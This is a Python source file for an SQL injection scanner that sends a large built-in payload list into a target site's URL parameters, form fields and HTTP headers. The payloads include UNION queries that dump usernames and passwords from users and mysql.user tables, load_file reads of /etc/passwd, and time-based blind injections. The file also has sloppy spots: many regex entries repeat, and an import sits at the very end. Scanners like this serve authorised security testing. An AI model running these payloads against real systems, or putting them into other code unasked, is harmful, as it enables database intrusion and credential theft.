#!/usr/bin/env python3
"""
SQL Injection Scanner Module
Author: SayerLinux
"""

import re
import requests
import time
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


class SQLScanner:
    """SQL Injection vulnerability scanner"""
    
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.get('user_agent')})
        
        # Load SQL injection payloads
        self.payloads = self._load_payloads()
        
        # Setup timeout and retries
        self.timeout = config.get('timeout', 30)
        self.retries = config.get('retries', 3)
    
    def _load_payloads(self) -> List[str]:
        """Load SQL injection payloads from file or use defaults"""
        payload_file = self.config.get('payloads.sql_payloads_file')
        
        if payload_file and os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Default SQL injection payloads
        return [
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "' OR 1=1#",
            '" OR 1=1#',
            "' OR 1=1/*",
            '" OR 1=1/*',
            "' UNION SELECT NULL--",
            '" UNION SELECT NULL--',
            "' UNION SELECT 1,2,3--",
            '" UNION SELECT 1,2,3--',
            "' AND 1=0 UNION SELECT 1,version()--",
            '" AND 1=0 UNION SELECT 1,version()--',
            "' AND 1=0 UNION SELECT 1,database()--",
            '" AND 1=0 UNION SELECT 1,database()--',
            "' AND 1=0 UNION SELECT 1,user()--",
            '" AND 1=0 UNION SELECT 1,user()--',
            "' AND 1=0 UNION SELECT 1,@@version--",
            '" AND 1=0 UNION SELECT 1,@@version--',
            "' AND 1=0 UNION SELECT 1,table_name FROM information_schema.tables--",
            '" AND 1=0 UNION SELECT 1,table_name FROM information_schema.tables--',
            "' AND 1=0 UNION SELECT 1,column_name FROM information_schema.columns--",
            '" AND 1=0 UNION SELECT 1,column_name FROM information_schema.columns--',
            "' AND 1=0 UNION SELECT 1,concat(user,0x3a,password) FROM mysql.user--",
            '" AND 1=0 UNION SELECT 1,concat(user,0x3a,password) FROM mysql.user--',
            "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' AND 1=2 UNION SELECT * FROM users--",
            "' AND 1=2 UNION SELECT username,password FROM users--",
            "' AND 1=2 UNION SELECT email,password FROM admin--",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' or 1=1 or ''='",
            "' or 'a'='a",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' OR '1'='1",
            "1' OR 1 -- -",
            "1' OR 1 #",
            "1' OR 1/*",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=2 UNION SELECT 1--",
            "1' AND 1=2 UNION SELECT 1,2--",
            "1' AND 1=2 UNION SELECT 1,2,3--",
            "1' AND 1=2 UNION SELECT 1,2,3,4--",
            "1' AND 1=2 UNION SELECT 1,2,3,4,5--",
            "1' AND 1=2 UNION SELECT 1,2,3,4,5,6--",
            "1' AND 1=2 UNION SELECT 1,2,3,4,5,6,7--",
            "1' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8--",
            "1' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "1' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "1' AND 1=2 UNION SELECT version()--",
            "1' AND 1=2 UNION SELECT database()--",
            "1' AND 1=2 UNION SELECT user()--",
            "1' AND 1=2 UNION SELECT @@version--",
            "1' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
            "1' AND 1=2 UNION SELECT column_name FROM information_schema.columns--",
            "1' AND 1=2 UNION SELECT table_name,column_name FROM information_schema.columns--",
            "1' AND 1=2 UNION SELECT schema_name FROM information_schema.schemata--",
            "1' AND 1=2 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
            "1' AND 1=2 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
            "1' AND 1=2 UNION SELECT username,password FROM users--",
            "1' AND 1=2 UNION SELECT email,password FROM admin--",
            "1' AND 1=2 UNION SELECT * FROM users WHERE 1=1--",
            "1' AND 1=2 UNION SELECT * FROM admin WHERE 1=1--",
            "1' AND 1=2 UNION SELECT * FROM mysql.user--",
            "1' AND 1=2 UNION SELECT host,user,password FROM mysql.user--",
            "1' AND 1=2 UNION SELECT load_file('/etc/passwd')--",
            "1' AND 1=2 UNION SELECT load_file('C:\\Windows\\System32\\drivers\\etc\\hosts')--"
        ]
    
    def scan(self, target: str) -> List[Dict[str, Any]]:
        """Scan target for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get initial response to find forms and parameters
            response = self.session.get(target, timeout=self.timeout)
            
            # Scan URL parameters
            url_vulns = self._scan_url_parameters(target)
            vulnerabilities.extend(url_vulns)
            
            # Scan forms
            form_vulns = self._scan_forms(target, response.text)
            vulnerabilities.extend(form_vulns)
            
            # Scan headers
            header_vulns = self._scan_headers(target)
            vulnerabilities.extend(header_vulns)
            
            # Blind SQL injection detection
            blind_vulns = self._scan_blind_sql(target)
            vulnerabilities.extend(blind_vulns)
            
        except Exception as e:
            print(f"Error in SQL scan: {str(e)}")
        
        return vulnerabilities
    
    def _scan_url_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Scan URL parameters for SQL injection"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload in self.payloads:
                try:
                    # Create test URL with payload
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    
                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._detect_sql_injection(response, payload):
                        db_type = self._identify_database(response)
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'subtype': 'Error-based SQL Injection',
                            'severity': 'critical',
                            'description': f'SQL injection in URL parameter: {param_name}',
                            'parameter': param_name,
                            'payload': payload,
                            'database_type': db_type,
                            'url': test_url,
                            'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_forms(self, url: str, html_content: str) -> List[Dict[str, Any]]:
        """Scan forms for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                form_url = urljoin(url, form_action)
                
                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    if not input_name:
                        continue
                    
                    input_type = input_tag.get('type', 'text')
                    if input_type.lower() in ['submit', 'button', 'hidden']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            form_data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                if name:
                                    if name == input_name:
                                        form_data[name] = payload
                                    else:
                                        form_data[name] = inp.get('value', 'test')
                            
                            if form_method == 'post':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            if self._detect_sql_injection(response, payload):
                                db_type = self._identify_database(response)
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'subtype': 'Form-based SQL Injection',
                                    'severity': 'critical',
                                    'description': f'SQL injection in form input: {input_name}',
                                    'form_action': form_action,
                                    'form_method': form_method,
                                    'input_name': input_name,
                                    'payload': payload,
                                    'database_type': db_type,
                                    'url': form_url,
                                    'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                                })
                            
                            time.sleep(self.config.get('delay', 0))
                            
                        except Exception as e:
                            continue
        
        except Exception as e:
            print(f"Error scanning forms: {str(e)}")
        
        return vulnerabilities
    
    def _scan_headers(self, url: str) -> List[Dict[str, Any]]:
        """Scan headers for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
        
        for header in headers_to_test:
            for payload in self.payloads:
                try:
                    headers = {header: payload}
                    response = self.session.get(url, headers=headers, timeout=self.timeout)
                    
                    if self._detect_sql_injection(response, payload):
                        db_type = self._identify_database(response)
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'subtype': 'Header-based SQL Injection',
                            'severity': 'critical',
                            'description': f'SQL injection via HTTP header: {header}',
                            'header': header,
                            'payload': payload,
                            'database_type': db_type,
                            'url': url,
                            'evidence': response.text[:300] + '...' if len(response.text) > 300 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_blind_sql(self, url: str) -> List[Dict[str, Any]]:
        """Scan for blind SQL injection vulnerabilities"""
        vulnerabilities = []
        
        blind_payloads = [
            # Time-based MySQL
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            '" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--',
            "' AND SLEEP(5)--",
            '" AND SLEEP(5)--',
            
            # Time-based PostgreSQL
            "' AND (SELECT pg_sleep(5))--",
            '" AND (SELECT pg_sleep(5))--',
            
            # Time-based SQL Server
            "' WAITFOR DELAY '0:0:5'--",
            '" WAITFOR DELAY "0:0:5"--',
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            '" AND 1=1--',
            '" AND 1=2--',
            
            # Error-based
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a)--",
            '" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a)--'
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload in blind_payloads:
                try:
                    # Test normal response time
                    start_time = time.time()
                    
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    
                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    # Check for time-based blind SQL injection
                    if response_time > 4.5:  # 5 seconds minus some tolerance
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'subtype': 'Blind SQL Injection (Time-based)',
                            'severity': 'critical',
                            'description': f'Blind SQL injection in URL parameter: {param_name}',
                            'parameter': param_name,
                            'payload': payload,
                            'response_time': response_time,
                            'url': test_url
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _detect_sql_injection(self, response: requests.Response, payload: str) -> bool:
        """Detect if SQL injection was successful"""
        try:
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type and 'text/plain' not in content_type:
                return False
            
            # Database error patterns
            error_patterns = [
                # MySQL
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"Driver.*SQL.*Server",
                r"OLE DB.*SQL Server",
                r"(\W|\A)SQL.*Server.*Driver",
                r"Warning.*mssql_.*",
                r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}",
                r"Exception.*Oracle",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*oci_.*",
                r"Warning.*ora_.*",
                r"Microsoft.*OLE.*DB.*Oracle",
                r"Microsoft.*OLE.*DB.*SQL.*Server",
                r"SQL.*Server.*OLE.*DB",
                r"SQL.*Server.*Driver",
                r"SQL.*Server.*Native.*Client",
                r"SQL.*Server.*ODBC",
                r"SQL.*Server.*OLE.*DB.*Provider",
                r"OLE.*DB.*Provider.*SQL.*Server",
                r"SQL.*Server.*ODBC.*Driver",
                r"SQL.*Server.*ODBC.*Provider",
                r"SQL.*Server.*OLE.*DB.*Driver",
                r"SQL.*Server.*OLE.*DB.*Provider",
                r"SQL.*Server.*Native.*Client",
                r"SQL.*Server.*Driver",
                r"SQL.*Server.*ODBC.*Driver",
                r"SQL.*Server.*OLE.*DB.*Provider",
                r"OLE.*DB.*Provider.*SQL.*Server",
                r"SQL.*Server.*ODBC.*Driver",
                r"SQL.*Server.*ODBC.*Provider",
                r"SQL.*Server.*OLE.*DB.*Driver",
                r"SQL.*Server.*OLE.*DB.*Provider",
                r"SQL.*Server.*Native.*Client"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
            
            return False
            
        except Exception as e:
            return False
    
    def _identify_database(self, response: requests.Response) -> str:
        """Identify the database type based on error messages"""
        try:
            text = response.text.lower()
            
            # MySQL indicators
            if any(indicator in text for indicator in ['mysql', 'mariadb']):
                return 'MySQL'
            
            # PostgreSQL indicators
            elif any(indicator in text for indicator in ['postgresql', 'psql']):
                return 'PostgreSQL'
            
            # SQL Server indicators
            elif any(indicator in text for indicator in ['sql server', 'mssql']):
                return 'Microsoft SQL Server'
            
            # Oracle indicators
            elif any(indicator in text for indicator in ['oracle', 'ora-']):
                return 'Oracle'
            
            # SQLite indicators
            elif any(indicator in text for indicator in ['sqlite']):
                return 'SQLite'
            
            else:
                return 'Unknown'
                
        except Exception as e:
            return 'Unknown'

import os  # Add this import for the file operations